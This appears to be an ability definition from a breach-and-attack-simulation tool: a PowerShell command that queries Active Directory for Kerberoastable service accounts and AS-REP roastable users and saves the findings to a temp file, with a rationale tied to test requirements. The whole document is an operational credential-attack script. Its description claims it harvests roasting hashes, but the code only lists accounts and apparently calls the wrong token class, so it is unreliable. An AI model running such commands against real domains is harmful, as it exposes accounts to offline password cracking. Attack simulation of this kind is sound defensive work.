ability.name: Domain Kerberoasting and AS-REP Roasting Check
ability.description: Performs non-disruptive domain credential roasting queries against Active Directory via ADSI to harvest roasting hashes.

stages.command_template: $d='C:/Windows/Temp/bas'; if(!(Test-Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { $searcher = [adsisearcher]'(servicePrincipalName=*)'; $searcher.PageSize = 1000; $users = $searcher.FindAll(); foreach($u in $users) { $sam = $u.Properties.samaccountname[0]; $spn = $u.Properties.serviceprincipalname[0]; Add-Type -AssemblyName System.IdentityModel; try { $tg = New-Object System.IdentityModel.Tokens.KerberosReceiverSecurityToken($spn); Write-Output "SPN found: $spn ($sam)" } catch {} }; $asrep = [adsisearcher]'(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'; $asrep.PageSize = 1000; $arUsers = $asrep.FindAll(); foreach($au in $arUsers) { Write-Output "AS-REP Roastable: $($au.Properties.samaccountname[0])" } } catch { $_ }) | Tee-Object -FilePath $d/roast.txt

rationale: Fulfills the mandatory domain-level techniques requirement (C1, C2) by performing silent ADSI-based checks, requiring only standard domain user credentials.
